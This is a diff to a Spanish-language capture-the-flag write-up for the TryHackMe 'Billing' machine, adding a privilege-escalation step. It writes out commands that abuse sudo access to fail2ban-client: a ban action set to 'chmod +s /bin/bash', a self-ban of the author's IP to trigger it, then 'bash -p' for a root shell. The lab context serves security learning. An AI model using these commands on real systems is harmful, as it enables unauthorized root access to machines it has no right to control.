@@ -2,7 +2,7 @@
 title: Billing
 description: Write Up máquina Billing de Try Hack Me
 published: true
-date: 2025-05-06T15:23:46.118Z
+date: 2025-05-06T15:50:35.080Z
 tags: write up
 editor: markdown
 dateCreated: 2025-05-06T15:23:46.118Z
@@ -111,4 +111,25 @@ Ahora vamos a comprobar que comandos podemos hacer mediante el uso de sudo -l
 IMAGEN SUDO -L
 
 
-Como podemos observar, somos capaces de ejecutar el comando fail2ban-client, como root sin problema
+Como podemos observar, somos capaces de ejecutar el comando fail2ban-client, como root sin problema. 
+```
+sudo fail2ban-client set asterisk-iptables action iptables-allports-ASTERISK actionban 'chmod +s /bin/bash'
+```
+Este comando hace que cuando fail2ban detecte una IP que no debería entrar, su sentencia es que ejecute el comando /bin/bash, com root.
+
+También es necesario autobanear nuestra popia IP, para ello ponemos
+```
+sudo /usr/bin/fail2ban-client set asterisk-iptables banip {IP}
+```
+
+IMAGEN FAIL2BAN
+
+Tras esto, podemos crear una nueva shell con
+```bash
+bash -p
+```
+
+IMAGEN BASH
+
+Tras esto podemos finalizar con la máquina ya que nos detecta que nuestra IP está vetada y por lo tanto nos inicia sesión como root, nos dirigimos al directorio de root y podemos usar el website.
+IMAGEN ROOT
